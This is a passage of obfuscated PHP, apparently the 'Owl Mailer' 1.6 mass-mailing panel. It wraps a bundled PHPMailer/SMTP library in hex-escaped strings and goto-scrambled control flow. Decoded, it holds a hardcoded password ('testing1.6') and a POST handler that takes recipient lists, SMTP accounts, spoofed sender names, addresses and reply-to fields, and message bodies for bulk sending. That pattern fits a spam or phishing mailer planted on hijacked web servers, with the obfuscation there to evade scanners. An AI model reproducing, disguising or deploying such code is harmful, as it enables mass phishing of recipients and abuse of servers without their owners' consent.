"\141\x75\x64\151\157\57\x78\x2d\x70\x6e\x2d\x72\x65\141\154\x61\165\x64\151\157", "\162\x70\155" => "\x61\165\x64\151\157\57\170\x2d\160\156\x2d\162\x65\x61\154\141\165\x64\x69\x6f\55\160\x6c\x75\x67\x69\x6e", "\162\141" => "\x61\165\144\x69\x6f\x2f\170\55\162\145\x61\x6c\x61\x75\144\x69\x6f", "\x77\141\166" => "\141\165\x64\151\x6f\x2f\x78\55\167\141\x76", "\155\x6b\141" => "\x61\165\144\x69\157\57\x78\55\x6d\141\164\x72\x6f\x73\x6b\141", "\x62\x6d\x70" => "\151\155\141\x67\x65\x2f\x62\x6d\x70", "\x67\151\146" => "\x69\x6d\141\x67\x65\57\x67\151\x66", "\x6a\160\x65\147" => "\x69\155\x61\147\x65\x2f\152\x70\145\147", "\152\160\x65" => "\151\155\x61\147\x65\x2f\152\160\145\147", "\152\160\x67" => "\151\155\141\147\x65\57\152\160\x65\x67", "\x70\156\147" => "\151\x6d\141\x67\145\x2f\160\x6e\147", "\164\x69\x66\x66" => "\x69\155\141\x67\145\57\x74\x69\x66\146", "\x74\x69\x66" => "\151\x6d\141\x67\145\x2f\164\x69\x66\146", "\167\145\x62\160" => "\151\155\141\147\145\x2f\x77\145\142\160", "\150\x65\x69\146" => "\151\155\x61\x67\145\x2f\150\145\151\146", "\150\x65\x69\146\163" => "\x69\x6d\141\147\145\x2f\150\x65\x69\146\55\163\x65\161\165\x65\x6e\143\x65", "\x68\145\x69\143" => "\x69\155\141\147\x65\x2f\x68\145\x69\x63", "\150\x65\x69\x63\x73" => "\x69\155\x61\x67\x65\x2f\150\x65\151\143\x2d\x73\x65\x71\165\x65\x6e\x63\x65", "\x65\155\154" => "\155\x65\x73\163\x61\x67\145\x2f\162\146\143\70\62\x32", "\143\x73\163" => "\164\145\x78\x74\x2f\143\x73\163", "\150\x74\155\x6c" => "\x74\145\170\x74\57\150\x74\155\154", "\150\x74\155" => "\x74\x65\170\164\x2f\150\x74\155\154", "\163\150\x74\x6d\x6c" => "\164\145\170\x74\x2f\150\x74\155\x6c", "\154\157\x67" => "\x74\145\x78\x74\57\160\154\141\151\156", "\x74\145\x78\x74" => "\164\x65\x78\x74\x2f\160\154\141\x69\x6e", "\x74\x78\164" => "\164\145\x78\164\x2f\160\154\x61\151\156", "\x72\x74\x78" => "\164\x65\170\164\x2f\162\x69\143\150\x74\x65\x78\x74", "\x72\x74\x66" => "\164\145\x78\164\57\162\x74\146", "\166\x63\146" => "\x74\145\x78\x74\57\166\x63\141\162\x64", "\x76\143\141\162\144" => "\164\145\170\164\57\x76\143\141\162\x64", "\151\143\163" => "\x74\145\170\164\x2f\x63\x61\154\x65\x6e\144\x61\162", "\x78\x6d\154" => "\x74\145\x78\164\57\170\155\154", "\170\x73\x6c" => "\164\x65\x78\164\x2f\170\x6d\x6c", "\167\155\x76" => "\x76\x69\144\145\157\57\x78\55\x6d\163\55\x77\x6d\166", "\155\x70\145\147" => "\x76\x69\x64\x65\157\x2f\x6d\160\x65\147", "\155\x70\145" => "\x76\x69\x64\x65\x6f\57\155\160\x65\x67", "\155\x70\x67" => "\x76\x69\144\x65\x6f\x2f\x6d\160\x65\x67", "\x6d\160\x34" => "\166\151\144\x65\157\57\155\160\x34", "\x6d\64\166" => "\x76\x69\x64\x65\157\x2f\155\160\x34", "\155\157\x76" => "\166\x69\144\x65\157\57\161\165\151\x63\x6b\x74\151\155\145", "\161\164" => "\166\x69\144\x65\x6f\57\161\x75\x69\143\153\164\151\155\145", "\x72\166" => "\x76\151\144\x65\x6f\57\x76\156\x64\x2e\x72\x6e\55\162\x65\141\154\166\151\x64\145\x6f", "\141\x76\151" => "\166\151\x64\x65\x6f\x2f\x78\55\155\x73\x76\151\x64\x65\x6f", "\x6d\x6f\166\151\145" => "\166\151\144\x65\x6f\57\170\x2d\x73\x67\151\x2d\x6d\157\166\151\145", "\167\145\142\x6d" => "\x76\151\144\x65\x6f\x2f\167\145\142\x6d", "\x6d\153\x76" => "\166\x69\144\x65\157\57\x78\x2d\155\141\x74\x72\x6f\x73\153\x61"); $ext = strtolower($ext); if (array_key_exists($ext, $mimes)) { return $mimes[$ext]; } return "\141\160\160\154\151\143\141\x74\151\x6f\156\57\157\143\164\145\164\55\163\164\x72\145\x61\x6d"; } public static function filenameToType($filename) { $qpos = strpos($filename, "\77"); if (false !== $qpos) { $filename = substr($filename, 0, $qpos); } $ext = static::mb_pathinfo($filename, PATHINFO_EXTENSION); return static::_mime_types($ext); } public static function mb_pathinfo($path, $options = null) { $ret = array("\144\151\x72\156\141\x6d\x65" => '', "\x62\x61\x73\145\156\x61\155\x65" => '', "\x65\x78\x74\145\x6e\x73\151\x6f\156" => '', "\146\x69\154\145\156\x61\x6d\x65" => ''); $pathinfo = array(); if (preg_match("\x23\x5e\x28\56\x2a\x3f\51\133\134\134\x2f\x5d\x2a\50\50\x5b\136\x2f\134\x5c\135\52\77\x29\x28\134\56\x28\133\136\x5c\56\x5c\x5c\57\135\x2b\77\51\x7c\51\x29\x5b\x5c\x5c\57\134\x2e\x5d\x2a\44\43\x69\x6d", $path, $pathinfo)) { if (array_key_exists(1, $pathinfo)) { $ret["\144\x69\x72\x6e\x61\155\145"] = $pathinfo[1]; } if (array_key_exists(2, $pathinfo)) { $ret["\142\141\x73\x65\x6e\141\x6d\145"] = $pathinfo[2]; } if (array_key_exists(5, $pathinfo)) { $ret["\x65\x78\164\x65\156\x73\x69\x6f\x6e"] = $pathinfo[5]; } if (array_key_exists(3, $pathinfo)) { $ret["\146\151\154\145\156\141\x6d\145"] = $pathinfo[3]; } } switch ($options) { case PATHINFO_DIRNAME: case "\x64\x69\x72\x6e\x61\x6d\145": return $ret["\144\x69\x72\156\141\x6d\145"]; case PATHINFO_BASENAME: case "\142\x61\163\145\x6e\141\155\145": return $ret["\142\x61\163\x65\x6e\141\x6d\145"]; case PATHINFO_EXTENSION: case "\x65\x78\x74\x65\x6e\x73\151\157\x6e": return $ret["\145\170\x74\x65\x6e\x73\x69\x6f\156"]; case PATHINFO_FILENAME: case "\146\151\154\x65\156\141\155\145": return $ret["\146\151\x6c\x65\x6e\141\155\x65"]; default: return $ret; } } public function set($name, $value = '') { if (property_exists($this, $name)) { $this->{$name} = $value; return true; } $this->setError($this->lang("\166\x61\x72\151\141\x62\154\x65\x5f\x73\x65\x74") . $name); return false; } public function secureHeader($str) { return trim(str_replace(array("\xd", "\12"), '', $str)); } public static function normalizeBreaks($text, $breaktype = null) { if (null === $breaktype) { $breaktype = static::$LE; } $text = str_replace(array("\15\xa", "\15"), "\12", $text); if ("\12" !== $breaktype) { $text = str_replace("\xa", $breaktype, $text); } return $text; } public static function getLE() { return static::$LE; } protected static function setLE($le) { static::$LE = $le; } public function sign($cert_filename, $key_filename, $key_pass, $extracerts_filename = '') { $this->sign_cert_file = $cert_filename; $this->sign_key_file = $key_filename; $this->sign_key_pass = $key_pass; $this->sign_extracerts_file = $extracerts_filename; } public function DKIM_QP($txt) { $line = ''; $len = strlen($txt); for ($i = 0; $i < $len; ++$i) { $ord = ord($txt[$i]); if (33 <= $ord and $ord <= 58 or $ord == 60 or 62 <= $ord and $ord <= 126) { $line .= $txt[$i]; } else { $line .= "\75" . sprintf("\45\60\x32\x58", $ord); } } return $line; } public function DKIM_Sign($signHeader) { if (!defined("\120\113\x43\x53\67\x5f\124\105\130\124")) { if ($this->exceptions) { throw new Exception($this->lang("\145\170\x74\x65\156\x73\x69\x6f\156\137\x6d\x69\163\x73\x69\156\147") . "\157\x70\x65\x6e\163\x73\x6c"); } return ''; } $privKeyStr = !empty($this->DKIM_private_string) ? $this->DKIM_private_string : file_get_contents($this->DKIM_private); if ('' != $this->DKIM_passphrase) { $privKey = openssl_pkey_get_private($privKeyStr, $this->DKIM_passphrase); } else { $privKey = openssl_pkey_get_private($privKeyStr); } if (openssl_sign($signHeader, $signature, $privKey, "\x73\x68\141\x32\65\x36\127\151\x74\150\x52\x53\101\105\156\143\162\x79\160\164\151\157\x6e")) { openssl_pkey_free($privKey); return base64_encode($signature); } openssl_pkey_free($privKey); return ''; } public function DKIM_HeaderC($signHeader) { $signHeader = preg_replace("\57\x5c\162\x5c\x6e\x5b\40\134\x74\x5d\x2b\57", "\40", $signHeader); $lines = explode("\15\12", $signHeader); foreach ($lines as $key => $line) { if (strpos($line, "\72") === false) { continue; } list($heading, $value) = explode("\72", $line, 2); $heading = strtolower($heading); $value = preg_replace("\57\133\x20\x5c\164\x5d\x7b\x32\x2c\x7d\57", "\x20", $value); $lines[$key] = trim($heading, "\40\11") . "\72" . trim($value, "\x20\11"); } return implode("\15\xa", $lines); } public function DKIM_BodyC($body) { if (empty($body)) { return "\xd\12"; } $body = static::normalizeBreaks($body, "\xd\12"); return rtrim($body, "\xd\12") . "\15\xa"; } public function DKIM_Add($headers_line, $subject, $body) { $DKIMsignatureType = "\x72\163\141\55\x73\x68\x61\62\x35\66"; $DKIMcanonicalization = "\162\145\x6c\141\x78\x65\144\x2f\x73\151\155\x70\154\x65"; $DKIMquery = "\x64\156\163\x2f\x74\170\164"; $DKIMtime = time(); $subject_header = "\123\165\142\152\145\143\164\72\40{$subject}"; $headers = explode(static::$LE, $headers_line); $from_header = ''; $to_header = ''; $date_header = ''; $current = ''; $copiedHeaderFields = ''; $foundExtraHeaders = array(); $extraHeaderKeys = ''; $extraHeaderValues = ''; $extraCopyHeaderFields = ''; foreach ($headers as $header) { if (strpos($header, "\106\x72\157\155\72") === 0) { $from_header = $header; $current = "\146\x72\x6f\155\x5f\x68\145\x61\144\x65\x72"; } elseif (strpos($header, "\x54\157\x3a") === 0) { $to_header = $header; $current = "\164\157\137\150\x65\141\144\145\162"; } elseif (strpos($header, "\x44\141\x74\x65\72") === 0) { $date_header = $header; $current = "\144\x61\164\145\x5f\x68\x65\141\x64\145\162"; } elseif (!empty($this->DKIM_extraHeaders)) { foreach ($this->DKIM_extraHeaders as $extraHeader) { if (strpos($header, $extraHeader . "\x3a") === 0) { $headerValue = $header; foreach ($this->CustomHeader as $customHeader) { if ($customHeader[0] === $extraHeader) { $headerValue = trim($customHeader[0]) . "\x3a\40" . $this->encodeHeader(trim($customHeader[1])); break; } } $foundExtraHeaders[$extraHeader] = $headerValue; $current = ''; break; } } } else { if (!empty(${$current}) and strpos($header, "\40\75\77") === 0) { ${$current} .= $header; } else { $current = ''; } } } foreach ($foundExtraHeaders as $key => $value) { $extraHeaderKeys .= "\72" . $key; $extraHeaderValues .= $value . "\15\xa"; if ($this->DKIM_copyHeaderFields) { $extraCopyHeaderFields .= "\x9\174" . str_replace("\174", "\x3d\x37\x43", $this->DKIM_QP($value)) . "\x3b\15\12"; } } if ($this->DKIM_copyHeaderFields) { $from = str_replace("\x7c", "\75\x37\103", $this->DKIM_QP($from_header)); $to = str_replace("\174", "\75\67\103", $this->DKIM_QP($to_header)); $date = str_replace("\x7c", "\75\67\x43", $this->DKIM_QP($date_header)); $subject = str_replace("\174", "\75\67\103", $this->DKIM_QP($subject_header)); $copiedHeaderFields = "\x9\172\x3d{$from}\15\12" . "\11\x7c{$to}\15\12" . "\x9\x7c{$date}\15\12" . "\x9\174{$subject}\73\15\xa" . $extraCopyHeaderFields; } $body = $this->DKIM_BodyC($body); $DKIMlen = strlen($body); $DKIMb64 = base64_encode(pack("\110\52", hash("\x73\150\x61\x32\x35\66", $body))); if ('' == $this->DKIM_identity) { $ident = ''; } else { $ident = "\40\151\x3d" . $this->DKIM_identity . "\73"; } $dkimhdrs = "\x44\x4b\111\115\x2d\x53\151\x67\156\141\x74\x75\x72\145\x3a\40\x76\x3d\x31\x3b\40\141\x3d" . $DKIMsignatureType . "\73\x20\161\75" . $DKIMquery . "\73\40\x6c\75" . $DKIMlen . "\x3b\40\163\75" . $this->DKIM_selector . "\x3b\15\xa" . "\11\x74\75" . $DKIMtime . "\73\x20\x63\x3d" . $DKIMcanonicalization . "\73\xd\xa" . "\x9\150\x3d\x46\162\x6f\x6d\x3a\124\x6f\72\x44\x61\x74\145\72\123\165\x62\152\145\143\x74" . $extraHeaderKeys . "\73\xd\xa" . "\x9\x64\75" . $this->DKIM_domain . "\73" . $ident . "\15\xa" . $copiedHeaderFields . "\11\142\x68\x3d" . $DKIMb64 . "\73\15\12" . "\11\142\75"; $toSign = $this->DKIM_HeaderC($from_header . "\15\xa" . $to_header . "\xd\12" . $date_header . "\xd\12" . $subject_header . "\xd\12" . $extraHeaderValues . $dkimhdrs); $signed = $this->DKIM_Sign($toSign); return static::normalizeBreaks($dkimhdrs . $signed) . static::$LE; } public static function hasLineLongerThanMax($str) { return (bool) preg_match("\57\136\50\56\173" . (self::MAX_LINE_LENGTH + strlen(static::$LE)) . "\x2c\x7d\x29\x2f\155", $str); } public function getToAddresses() { return $this->to; } public function getCcAddresses() { return $this->cc; } public function getBccAddresses() { return $this->bcc; } public function getReplyToAddresses() { return $this->ReplyTo; } public function getAllRecipientAddresses() { return $this->all_recipients; } protected function doCallback($isSent, $to, $cc, $bcc, $subject, $body, $from, $extra) { if (!empty($this->action_function) and is_callable($this->action_function)) { call_user_func($this->action_function, $isSent, $to, $cc, $bcc, $subject, $body, $from, $extra); } } public function getOAuth() { return $this->oauth; } public function setOAuth(OAuth $oauth) { $this->oauth = $oauth; } } goto nRHYo; do62A: if (isset($_POST["\x61\143\164\x69\157\156"]) && $_POST["\x61\x63\164\x69\157\x6e"] == "\163\x65\x6e\x64") { $GLOBALS["\x72\x65\143\x69\x70\151\145\156\x74"] = owlTrim($_POST["\x72\145\143\x69\160\151\x65\x6e\x74"]); $GLOBALS["\x73\155\x74\x70\x41\x63\x63\x74"] = owlTrim($_POST["\163\155\164\160\101\x63\x63\x74"]); $GLOBALS["\x73\x65\156\x64\145\162\x4e\x61\155\145"] = owlTrim($_POST["\163\x65\x6e\x64\x65\162\x4e\141\155\145"]); $GLOBALS["\163\x65\156\144\151\x6e\147\x4d\x65\164\x68\157\144"] = owlTrim($_POST["\163\145\x6e\144\x69\x6e\x67\x4d\145\x74\x68\x6f\144"]); $GLOBALS["\163\145\156\144\145\162\x45\155\141\151\x6c"] = owlTrim($_POST["\x73\145\156\144\x65\162\x45\155\141\151\154"]); $GLOBALS["\162\145\160\x6c\171\x54\x6f"] = owlTrim($_POST["\162\145\x70\x6c\x79\124\157"]); $messageLetter = owlTrim($_POST["\155\145\163\163\141\147\145\114\145\x74\164\x65\x72"]); $messageLetter = urlencode($messageLetter); $messageLetter = preg_replace("\x2f\x25\65\103\x25\62\62\57", "\45\x32\62", $messageLetter); $messageLetter = urldecode($messageLetter); $GLOBALS["\x6d\145\x73\x73\x61\147\x65\x4c\145\164\x74\145\x72"] = stripslashes($messageLetter); $altMessageLetter = owlTrim($_POST["\x61\154\164\115\x65\x73\163\x61\147\145\x4c\145\x74\164\145\x72"]); $altMessageLetter = urlencode($altMessageLetter); $altMessageLetter = preg_replace("\x2f\45\x35\x43\45\62\x32\x2f", "\x25\x32\62", $altMessageLetter); $altMessageLetter = urldecode($altMessageLetter); $GLOBALS["\141\x6c\x74\115\x65\163\163\141\147\x65\114\145\x74\x74\x65\162"] = stripslashes($altMessageLetter); $GLOBALS["\155\x65\163\163\141\147\x65\x54\171\x70\x65"] = owlTrim($_POST["\x6d\145\x73\x73\x61\147\145\124\x79\160\145"]); $encodingType = owlTrim($_POST["\x65\x6e\143\x6f\x64\151\x6e\x67\x54\171\160\145"]); $GLOBALS["\145\156\x63\x6f\x64\x69\156\147\x54\171\160\145"] = stripslashes($encodingType); $emailPriority = owlTrim($_POST["\145\x6d\x61\x69\154\x50\162\x69\157\162\151\x74\171"]); $GLOBALS["\145\155\x61\x69\x6c\120\162\151\157\162\151\164\171"] = stripslashes($emailPriority); $messageSubject = owlTrim($_POST["\x6d\x65\163\x73\141\147\145\123\x75\x62\152\x65\x63\x74"]); $GLOBALS["\155\x65\163\163\141\147\x65\x53\x75\142\152\x65\x63\x74"] = stripslashes($messageSubject); processEmailSendingRequest(); } goto PCw4v; qC4va: $owl["\166\x65\162\x73\151\x6f\x6e"] = "\61\56\66"; goto hN__n; hN__n: $owl["\167\145\142\163\151\164\145"] = "\x6f\167\154\x6d\141\151\x6c\145\x72\x2e\151\157"; goto oov1b; mXdsU: header("\120\x72\141\x67\x6d\141\72\x20\x6e\x6f\x2d\x63\141\x63\150\x65"); goto a2nuF; sxS5D: echo $owl["\x76\x65\162\163\x69\157\x6e"]; goto CgtIZ; l_KbL: header("\103\x61\x63\x68\x65\x2d\103\157\156\x74\x72\x6f\154\72\40\156\x6f\55\163\164\157\162\145\54\x20\x6e\x6f\55\x63\x61\x63\x68\145\x2c\x20\155\165\163\164\55\162\145\166\141\154\151\144\141\x74\145\54\x20\155\141\x78\55\x61\147\x65\75\x30"); goto icWAc; PCw4v: $sessioncode = md5(__FILE__); goto nfFPE; MtSlb: $password = "\x74\x65\x73\x74\x69\x6e\x67\61\x2e\66"; goto qC4va; KMPxz: class phpmailerException extends Exception { public function errorMessage() { $errorMsg = "\x3c\x73\164\x72\157\x6e\147\x3e" . $this->getMessage() . "\x3c\x2f\x73\164\162\x6f\x6e\x67\x3e\74\142\162\40\57\76\12"; return $errorMsg; } } goto koFUB; nRHYo: class SMTP { const VERSION = "\x36\x2e\x30\x2e\x37"; const LE = "\xd\xa"; const DEFAULT_PORT = 25; const MAX_LINE_LENGTH = 998; const DEBUG_OFF = 0; const DEBUG_CLIENT = 1; const DEBUG_SERVER = 2; const DEBUG_CONNECTION = 3; const DEBUG_LOWLEVEL = 4; public $do_debug = self::DEBUG_OFF; public $Debugoutput = "\145\x63\x68\157"; public $do_verp = false; public $Timeout = 300; public $Timelimit = 300; protected $smtp_transaction_id_patterns = array("\x65\170\x69\155" => "\x2f\x5b\134\x64\x5d\173\x33\175\x20\x4f\x4b\x20\x69\144\x3d\x28\x2e\x2a\x29\x2f", "\163\x65\x6e\x64\155\x61\151\x6c" => "\57\x5b\x5c\x64\135\x7b\x33\x7d\40\62\x2e\x30\x2e\x30\x20\x28\56\x2a\x29\x20\x4d\x65\x73\x73\x61\x67\x65\57", "\x70\x6f\163\x74\x66\151\x78" => "\57\x5b\134\144\x5d\x7b\x33\x7d\x20\62\x2e\x30\56\60\x20\117\x6b\72\x20\161\x75\145\165\145\144\40\x61\163\x20\x28\x2e\x2a\x29\57", "\x4d\x69\x63\162\x6f\x73\157\146\x74\x5f\x45\123\x4d\x54\120" => "\x2f\133\x30\55\71\135\x7b\x33\175\x20\62\56\133\134\x64\135\56\x30\40\50\56\x2a\x29\x40\x28\x3f\72\56\52\x29\x20\121\x75\x65\x75\145\x64\40\x6d\x61\151\x6c\40\x66\x6f\x72\x20\x64\x65\154\x69\166\x65\162\x79\x2f", "\x41\155\141\172\x6f\x6e\x5f\123\x45\123" => "\x2f\133\x5c\x64\135\173\x33\175\40\x4f\x6b\40\x28\56\x2a\51\57", "\123\145\x6e\144\107\x72\x69\x64" => "\x2f\x5b\x5c\x64\x5d\173\x33\175\40\x4f\153\72\40\x71\x75\145\165\x65\x64\x20\x61\163\40\50\56\x2a\51\x2f", "\x43\141\155\160\141\x69\x67\156\x4d\x6f\x6e\151\164\157\162" => "\x2f\x5b\134\x64\x5d\173\x33\175\40\62\x2e\x30\x2e\60\40\x4f\x4b\x3a\x28\133\141\55\172\101\x2d\132\134\x64\135\173\64\x38\175\x29\57"); protected $last_smtp_transaction_id; protected $smtp_conn; protected $error = array("\145\162\162\x6f\162" => '', "\144\x65\x74\x61\x69\154" => '', "\163\x6d\164\x70\137\x63\x6f\x64\145" => '', "\163\x6d\x74\x70\137\143\x6f\144\145\137\145\170" => ''); protected $helo_rply = null; protected $server_caps = null; protected $last_reply = ''; protected function edebug($str, $level = 0) { if ($level > $this->do_debug) { return; } if ($this->Debugoutput instanceof \Psr\Log\LoggerInterface) { $this->Debugoutput->debug($str); return; } if (!in_array($this->Debugoutput, array("\x65\x72\162\157\162\137\154\x6f\147", "\150\x74\x6d\154", "\145\143\150\x6f")) and is_callable($this->Debugoutput)) { call_user_func($this->Debugoutput, $str, $level); return; } switch ($this->Debugoutput) { case "\145\x72\162\x6f\162\137\x6c\157\x67": error_log($str); break; case "\150\x74\x6d\x6c": echo gmdate("\131\55\x6d\55\x64\40\110\x3a\151\x3a\163"), "\40", htmlentities(preg_replace("\57\x5b\x5c\162\x5c\x6e\x5d\x2b\x2f", '', $str), ENT_QUOTES, "\125\124\x46\x2d\70"), "\x3c\142\162\x3e\12"; break; case "\x65\143\150\x6f": default: $str = preg_replace("\57\x5c\162\134\x6e\174\134\162\x2f\155\x73", "\xa", $str); echo gmdate("\131\55\x6d\x2d\144\40\110\72\151\x3a\163"), "\x9", trim(str_replace("\xa", "\12\x20\40\x20\40\40\x20\x20\x20\x20\x20\x20\x20\40\40\x20\40\x20\40\40\11\40\40\x20\x20\40\x20\40\x20\40\x20\x20\40\x20\40\x20\x20\40\x20", trim($str))), "\12"; } } public function connect($host, $port = null, $timeout = 30, $options = array()) { static $streamok; if (null === $streamok) { $streamok = function_exists("\x73\164\x72\145\141\155\137\163\x6f\143\153\145\164\137\x63\154\151\145\x6e\164"); } $this->setError(''); if ($this->connected()) { $this->setError("\101\x6c\x72\x65\x61\144\171\40\143\157\x6e\x6e\145\x63\164\x65\144\x20\x74\x6f\40\x61\40\x73\x65\162\166\x65\162"); return false; } if (empty($port)) { $port = self::DEFAULT_PORT; } $this->edebug("\103\157\x6e\156\x65\x63\x74\x69\x6f\x6e\72\x20\x6f\160\x65\156\151\156\x67\x20\164\157\40{$host}\72{$port}\54\40\164\151\155\x65\157\x75\x74\x3d{$timeout}\x2c\x20\x6f\160\164\151\157\156\163\x3d" . (count($options) > 0 ? var_export($options, true) : "\x61\162\x72\141\x79\50\x29"), self::DEBUG_CONNECTION); $errno = 0; $errstr = ''; if ($streamok) { $socket_context = stream_context_create($options); set_error_handler(array($this, "\145\162\x72\x6f\162\110\141\156\144\154\145\162")); $this->smtp_conn = stream_socket_client($host . "\72" . $port, $errno, $errstr, $timeout, STREAM_CLIENT_CONNECT, $socket_context); restore_error_handler(); } else { $this->edebug("\x43\x6f\156\156\145\x63\164\151\x6f\x6e\x3a\x20\x73\x74\162\145\141\x6d\137\163\157\x63\x6b\145\x74\x5f\x63\154\x69\x65\x6e\x74\40\x6e\x6f\x74\40\x61\166\x61\151\x6c\x61\x62\154\145\x2c\40\146\141\x6c\x6c\151\x6e\x67\40\x62\x61\x63\153\40\164\x6f\40\x66\x73\157\143\x6b\157\x70\145\x6e", self::DEBUG_CONNECTION); set_error_handler(array($this, "\x65\162\x72\x6f\162\x48\141\156\x64\x6c\145\x72")); $this->smtp_conn = fsockopen($host, $port, $errno, $errstr, $timeout); restore_error_handler(); } if (!is_resource($this->smtp_conn)) { $this->setError("\106\141\151\154\x65\144\x20\164\x6f\40\x63\x6f\156\x6e\145\x63\x74\40\164\x6f\40\163\145\162\x76\145\162", '', (string) $errno, (string) $errstr); $this->edebug("\123\x4d\124\x50\x20\x45\122\x52\x4f\122\72\40" . $this->error["\145\162\162\x6f\x72"] . "\72\40{$errstr}\x20\x28{$errno}\51", self::DEBUG_CLIENT); return false; } $this->edebug("\103\157\x6e\156\145\x63\164\x69\x6f\x6e\72\x20\x6f\160\x65\x6e\145\144", self::DEBUG_CONNECTION); if (substr(PHP_OS, 0, 3) != "\127\111\116") { $max = ini_get("\155\x61\x78\x5f\145\x78\145\x63\165\164\151\157\156\x5f\x74\x69\155\145"); if (0 != $max and $timeout > $max) { @set_time_limit($timeout); } stream_set_timeout($this->smtp_conn, $timeout, 0); } $announce = $this->get_lines(); $this->edebug("\123\105\x52\126\x45\x52\x20\x2d\76\40\103\x4c\111\x45\116\x54\x3a\40" . $announce, self::DEBUG_SERVER); return true; } public function startTLS() { if (!$this->sendCommand("\123\x54\101\122\124\124\114\x53", "\x53\x54\101\122\124\x54\x4c\x53", 220)) { return false; } $crypto_method = STREAM_CRYPTO_METHOD_TLS_CLIENT; if (defined("\x53\x54\122\105\101\x4d\x5f\x43\122\x59\120\x54\x4f\137\x4d\105\124\x48\117\104\137\124\114\x53\166\x31\x5f\x32\137\103\x4c\111\x45\116\124")) { $crypto_method |= STREAM_CRYPTO_METHOD_TLSv1_2_CLIENT; $crypto_method |= STREAM_CRYPTO_METHOD_TLSv1_1_CLIENT; } set_error_handler(array($this, "\145\162\162\x6f\162\110\141\156\144\154\145\162")); $crypto_ok = stream_socket_enable_crypto($this->smtp_conn, true, $crypto_method); restore_error_handler(); return (bool) $crypto_ok; } public function authenticate($username, $password, $authtype = null, $OAuth = null) { if (!$this->server_caps) { $this->setError("\101\165\164\x68\x65\x6e\x74\x69\x63\x61\x74\151\157\x6e\x20\151\163\x20\x6e\x6f\x74\x20\x61\x6c\x6c\157\x77\x65\x64\x20\142\x65\x66\157\x72\x65\40\x48\105\114\x4f\x2f\x45\x48\114\x4f"); return false; } if (array_key_exists("\x45\x48\114\x4f", $this->server_caps)) { if (!array_key_exists("\101\125\x54\110", $this->server_caps)) { $this->setError("\101\x75\164\x68\145\x6e\x74\x69\x63\141\x74\x69\x6f\156\40\151\163\40\156\157\x74\40\141\154\x6c\157\x77\145\144\40\x61\164\40\x74\150\x69\x73\x20\x73\x74\141\147\145"); return false; } $this->edebug("\101\x75\164\150\x20\x6d\x65\x74\150\157\144\x20\162\x65\x71\x75\x65\163\x74\145\x64\x3a\x20" . ($authtype ? $authtype : "\125\116\123\120\x45\103\111\x46\111\x45\x44"), self::DEBUG_LOWLEVEL); $this->edebug("\x41\x75\164\150\x20\x6d\x65\x74\150\157\x64\x73\x20\141\x76\x61\x69\154\141\x62\154\145\40\x6f\x6e\40\164\x68\145\x20\x73\x65\x72\x76\145\x72\72\40" . implode("\x2c", $this->server_caps["\x41\x55\124\x48"]), self::DEBUG_LOWLEVEL); if (null !== $authtype and !in_array($authtype, $this->server_caps["\101\125\x54\x48"])) { $this->edebug("\122\x65\x71\x75\145\163\x74\145\144\x20\x61\x75\x74\150\x20\155\x65\x74\150\157\144\40\156\x6f\x74\x20\x61\166\141\151\x6c\141\142\154\x65\72\40" . $authtype, self::DEBUG_LOWLEVEL); $authtype = null; } if (empty($authtype)) { foreach (array("\103\122\x41\115\55\115\104\x35", "\114\x4f\107\111\116", "\x50\x4c\x41\x49\x4e", "\x58\117\x41\x55\124\110\x32") as $method) { if (in_array($method, $this->server_caps["\x41\125\124\x48"])) { $authtype = $method; break; } } if (empty($authtype)) { $this->setError("\x4e\x6f\x20\163\x75\x70\x70\157\x72\164\x65\x64\x20\141\x75\164\150\x65\x6e\x74\x69\143\141\164\151\157\156\40\155\x65\x74\x68\157\144\x73\x20\146\157\165\156\144"); return false; } self::edebug("\101\x75\164\150\x20\x6d\x65\x74\150\x6f\144\x20\x73\x65\154\x65\x63\164\145\x64\x3a\x20" . $authtype, self::DEBUG_LOWLEVEL); } if (!in_array($authtype, $this->server_caps["\x41\x55\x54\110"])) { $this->setError("\124\x68\145\40\162\x65\161\x75\145\x73\164\145\144\x20\141\x75\x74\150\x65\x6e\164\151\x63\x61\164\151\x6f\x6e\x20\x6d\145\164\x68\x6f\x64\40\42{$authtype}\42\x20\x69\x73\40\156\157\x74\x20\163\x75\x70\x70\x6f\x72\x74\145\x64\40\142\171\40\x74\x68\145\40\x73\x65\162\x76\x65\162"); return false; } } elseif (empty($authtype)) { $authtype = "\x4c\x4f\107\111\x4e"; } switch ($authtype) { case "\x50\x4c\101\111\116": if (!$this->sendCommand("\101\x55\124\110", "\x41\125\x54\110\40\x50\x4c\x41\x49\116", 334)) { return false; } if (!$this->sendCommand("\x55\163\x65\x72\x20\46\x20\120\x61\163\x73\167\157\x72\x64", base64_encode("\x0" . $username . "\0" . $password), 235)) { return false; } break; case "\114\117\x47\111\x4e": if (!$this->sendCommand("\x41\125\124\110", "\101\125\x54\x48\x20\114\x4f\107\x49\116", 334)) { return false; } if (!$this->sendCommand("\x55\x73\x65\162\156\x61\x6d\145", base64_encode($username), 334)) { return false; } if (!$this->sendCommand("\120\141\x73\x73\x77\x6f\x72\144", base64_encode($password), 235)) { return false; } break; case "\103\122\101\x4d\55\115\x44\x35": if (!$this->sendCommand("\101\125\x54\x48\40\x43\x52\x41\115\55\x4d\x44\65", "\x41\x55\124\110\40\x43\122\101\115\55\x4d\x44\x35", 334)) { return false; } $challenge = base64_decode(substr($this->last_reply, 4)); $response = $username . "\40" . $this->hmac($challenge, $password); return $this->sendCommand("\125\x73\145\162\x6e\141\x6d\x65", base64_encode($response), 235); case "\130\117\x41\x55\124\x48\62": if (null === $OAuth) { return false; } $oauth = $OAuth->getOauth64(); if (!$this->sendCommand("\x41\125\124\x48", "\x41\125\124\x48\40\130\117\101\125\124\110\62\40" . $oauth, 235)) { return false; } break; default: $this->setError("\x41\x75\x74\x68\x65\x6e\164\151\x63\141\164\151\x6f\x6e\x20\x6d\145\164\150\157\x64\40\42{$authtype}\42\40\x69\163\x20\156\x6f\164\40\x73\165\160\x70\157\162\164\x65\x64"); return false; } return true; } protected function hmac($data, $key) { if (function_exists("\x68\x61\163\x68\137\150\x6d\x61\x63")) { return hash_hmac("\x6d\x64\65", $data, $key); } $bytelen = 64; if (strlen($key) > $bytelen) { $key = pack("\110\52", md5($key)); } $key = str_pad($key, $bytelen, chr(0)); $ipad = str_pad('', $bytelen, chr(54)); $opad = str_pad('', $bytelen, chr(92)); $k_ipad = $key ^ $ipad; $k_opad = $key ^ $opad; return md5($k_opad . pack("\110\x2a", md5($k_ipad . $data))); } public function connected() { if (is_resource($this->smtp_conn)) { $sock_status = stream_get_meta_data($this->smtp_conn); if ($sock_status["\145\x6f\x66"]) { 